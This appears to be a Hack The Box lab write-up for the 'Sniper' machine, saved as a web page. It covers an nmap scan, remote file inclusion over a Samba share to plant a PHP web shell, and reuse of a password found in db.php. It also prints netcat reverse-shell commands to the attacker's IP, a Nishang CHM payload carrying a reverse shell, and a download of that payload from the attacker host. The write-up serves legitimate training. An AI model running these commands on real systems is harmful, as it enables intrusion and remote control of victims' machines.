@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/Hack-The-Box/assets/css/style.css?v=b97ffc4e5c8d8ce4830c7f2956e1e09622ee8b5d">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Hack-The-Box</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Hack-The-Box" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="https://zer0codex.github.io/Hack-The-Box/Sniper/Sniper.html" />
+<meta property="og:url" content="https://zer0codex.github.io/Hack-The-Box/Sniper/Sniper.html" />
+<meta property="og:site_name" content="Hack-The-Box" />
+<script type="application/ld+json">
+{"@type":"WebPage","headline":"Hack-The-Box","url":"https://zer0codex.github.io/Hack-The-Box/Sniper/Sniper.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>Hack-The-Box</h1>
+        <h2></h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/Zer0CodeX/Hack-The-Box" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        
+<p><img src="sniper-01.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<hr />
+<h2 id="nmap">NMAP:</h2>
+<p>As always we will start with Nmap to scan for open ports and services:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">
+</span><span class="gp">#</span><span class="w"> </span>Nmap 7.80 scan initiated Mon Mar  9 17:56:22 2020 as: nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-oA</span> sniper <span class="nt">-v</span> 10.10.10.151
+<span class="go">Nmap scan report for 10.10.10.151 (10.10.10.151)
+Host is up (0.16s latency).
+Not shown: 65530 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+49667/tcp open  msrpc         Microsoft Windows RPC
+</span><span class="gp">Service Info: OS: Windows;</span><span class="w"> </span>CPE: cpe:/o:microsoft:windows
+<span class="go">
+Host script results:
+|_clock-skew: 7h01m55s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-03-09T23:08:46
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Mon Mar  9 18:07:28 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>666.29 seconds
+<span class="go">
+
+</span></code></pre></div></div>
+
+<hr />
+<ul>
+  <li>Lets check HTTP service</li>
+</ul>
+
+<p><img src="sniper-02.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<ul>
+  <li>First thing we found is a login page</li>
+</ul>
+
+<p><img src="sniper-03.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<p>We tried to register and login but the page shows under construction message</p>
+
+<p><img src="sniper-04.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<hr />
+<h2 id="rfi-">RFI :</h2>
+
+<ul>
+  <li>When exploring the website we notice that page which could lead to LFI/RFI</li>
+</ul>
+
+<p><img src="sniper-05.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<ul>
+  <li>After many trials and researches  I found that article in the Resources that using samba share with RFI
+So I configured my share as following and add a PHP web shell</li>
+</ul>
+
+<p><img src="sniper-06.jpg" alt="alt text" title="Zer0Code" />
+<img src="sniper-07.jpg" alt="alt text" title="Zer0Code" />
+<img src="sniper-08.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<ul>
+  <li>Let’s use the web shell to know users of the machine</li>
+</ul>
+
+<p><img src="sniper-09.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<ul>
+  <li>When exploring the web files we found that db.php which contain a potential creds</li>
+</ul>
+
+<p><img src="sniper-10.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<h2 id="reverse-powershell-">Reverse Powershell :</h2>
+
+<ul>
+  <li>Let’s use the web shell to upload Netcat and try to use the creds to gain a reverse Powershell</li>
+</ul>
+
+<p><img src="sniper-11.jpg" alt="alt text" title="Zer0Code" />
+<img src="sniper-12.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<h2 id="user-">User :</h2>
+
+<ul>
+  <li>Let’s try the password with user Chris and use Netcat to gain a reverse shell</li>
+</ul>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "C:<span class="se">\t</span>mp" /grant iusr:F
+
+$user = "SNIPER<span class="se">\\</span>Chris"
+$password = "36mEAhz/B8xQ~2VM"
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
+Invoke-Command -ComputerName SNIPER -Credential $credential -ScriptBlock { C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe -e powershell.exe 10.10.16.22 5555}
+
+</code></pre></div></div>
+
+<p><img src="sniper-13.jpg" alt="alt text" title="Zer0Code" />
+<img src="sniper-14.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<p>And We got User Flag</p>
+
+<hr />
+<p>When exploring the files on the machine we found this massage in Docs folder</p>
+
+<p><img src="sniper-15.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<p>Also, We found that indstuctions.chm file in the Downloads folder</p>
+
+<p><img src="sniper-16.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<p>I copied the file to samba share and opened it on Windows machine</p>
+
+<p><img src="sniper-17.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<ul>
+  <li>and We decided to snipe him :D</li>
+</ul>
+
+<hr />
+
+<h2 id="root-">Root :</h2>
+<p>after searching on Web about this file type we found that Nishang PS script to create CHM payload</p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Out-CHM –Payload "C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe 10.10.16.22 6666 -e powershell.exe" –HHCPath “C:<span class="se">\P</span>rogram Files (x86)<span class="se">\H</span>TML Help Workshop”
+</code></pre></div></div>
+
+<p><img src="sniper-18.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<ul>
+  <li>Let’s copy the payload to the machine over HTTP</li>
+</ul>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Invoke-WebRequest -Uri http://10.10.16.22/doc.chm -OutFile c:<span class="se">\d</span>ocs<span class="se">\d</span>oc.chm
+
+</code></pre></div></div>
+
+<p><img src="sniper-19.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<p><img src="sniper-20.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<ul>
+  <li>and we got root flag</li>
+</ul>
+
+<p><img src="sniper-21.jpg" alt="alt text" title="Zer0Code" /></p>
+
+<h2 id="resources">Resources:</h2>
+
+<p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>
+
+<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a></p>
+
+<p><a href="https://www.hackthebox.eu/profile/131282" title="Zer0Code"><img src="https://www.hackthebox.eu/badge/image/131282" alt="alt text" /></a></p>
+
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
